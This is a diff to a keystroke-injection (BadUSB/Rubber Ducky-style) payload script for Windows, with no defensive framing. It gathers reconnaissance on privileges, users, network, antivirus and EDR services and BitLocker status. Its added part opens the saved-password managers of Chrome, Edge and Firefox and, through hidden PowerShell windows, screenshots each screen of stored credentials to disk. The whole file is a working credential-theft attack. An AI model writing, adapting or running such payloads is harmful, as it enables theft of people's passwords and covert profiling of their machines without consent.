@@ -8,7 +8,7 @@ DELAY 500
 STRING powershell
 DELAY 500
 ENTER
-DELAY 1000
+DELAY 3000
 
 REM Create storage
 DELAY 500
@@ -39,3 +39,95 @@ DELAY 500
 STRING New-Item -ItemType Directory -Path C:\$env:USERNAME-$(hostname) -Force; $f="C:\$env:USERNAME-$(hostname)\info.txt"; "========== PRIVILEGES ==========" | Out-File $f; whoami /priv | Out-File $f -Append; "========== WHOAMI ==========" | Out-File $f -Append; whoami | Out-File $f -Append; "========== USERS ==========" | Out-File $f -Append; net user | Out-File $f -Append; "========== IP CONFIG ==========" | Out-File $f -Append; ipconfig /all | Out-File $f -Append; "========== FIREWALL PROFILE ==========" | Out-File $f -Append; Get-NetFirewallProfile | Out-File $f -Append; "========== SYSTEM INFO ==========" | Out-File $f -Append; systeminfo | Out-File $f -Append; "========== GROUPS ==========" | Out-File $f -Append; whoami /groups | Out-File $f -Append; "========== PROGRAM FILES ==========" | Out-File $f -Append; Get-ChildItem 'C:\Program Files' | Out-File $f -Append; "========== ANTIVIRUS INFO ==========" | Out-File $f -Append; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File $f -Append; "========== SECURITY SERVICES ==========" | Out-File $f -Append; Get-Service | Where-Object { $_.DisplayName -match 'Defender|EDR|Endpoint|Security|Antivirus|Sophos|Sentinel|CrowdStrike|Trend|Kaspersky|ESET|Bitdefender' } | Out-File $f -Append; "========= BITLOCKER STATUS =========`n" | Out-File $f -Append;$bitlocker_status = (New-Object -ComObject Shell.Application).NameSpace('C:').Self.ExtendedProperty('System.Volume.BitLockerProtection'); if ($bitlocker_status -eq "0") { $status_verbose = "Unencryptable" } elseif ($bitlocker_status -eq "1") { $status_verbose = "Encrypted" } elseif ($bitlocker_status -eq "2") { $status_verbose = "Not Encrypted" } elseif ($bitlocker_status -eq "7") { $status_verbose = "Not supported" } else { $status_verbose = "Not known" }; $status_final = $bitlocker_status.ToString() + ": " + $status_verbose; $status_final + "`n" | Out-File $f -Append 
 DELAY 3000
 ENTER
+
+REM Launch
+DELAY 1000
+
+REM ======================================= CHROME =======================================
+REM launch chrome
+GUI r
+DELAY 500
+STRING chrome
+ENTER
+DELAY 1000
+
+REM password in chrome
+STRING chrome://password-manager/passwords
+DELAY 500
+ENTER
+
+REM Entire screen chrome
+F11
+DELAY 500
+
+REM launch powershell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 3000
+
+STRING powershell -window hidden mkdir C:\$env:USERNAME-$(hostname)\captures; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $filename = "C:\$env:USERNAME-$(hostname)\captures\chrome_capture.png"; $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png); Start-Process $filename
+DELAY 3000
+ENTER 
+DELAY 1000
+
+REM ======================================= EDGE =======================================
+REM launch msedge
+GUI r
+DELAY 500
+STRING msedge
+ENTER
+DELAY 2000
+
+REM password in msedge
+STRING edge://wallet/passwords
+DELAY 500
+ENTER
+DELAY 500
+
+REM Entire screen edge
+F11
+DELAY 500
+
+REM launch powershell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 3000
+
+STRING powershell -window hidden mkdir C:\$env:USERNAME-$(hostname)\captures; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $filename = "C:\$env:USERNAME-$(hostname)\captures\msedge_capture.png"; $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png); Start-Process $filename
+DELAY 3000
+ENTER 
+DELAY 1000
+
+REM ======================================= FIREFOX =======================================
+REM launch firefox
+GUI r
+DELAY 500
+STRING firefox
+ENTER
+DELAY 1000
+
+REM password in firefox
+STRING about:logins
+DELAY 1000
+ENTER
+DELAY 500
+
+REM Entire screen firefox
+F11
+DELAY 500
+
+REM launch powershell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 3000
+
+STRING powershell -window hidden mkdir C:\$env:USERNAME-$(hostname)\captures; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $filename = "C:\$env:USERNAME-$(hostname)\captures\firefox_capture.png"; $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png); Start-Process $filename
+DELAY 3000
+ENTER 
+DELAY 1000
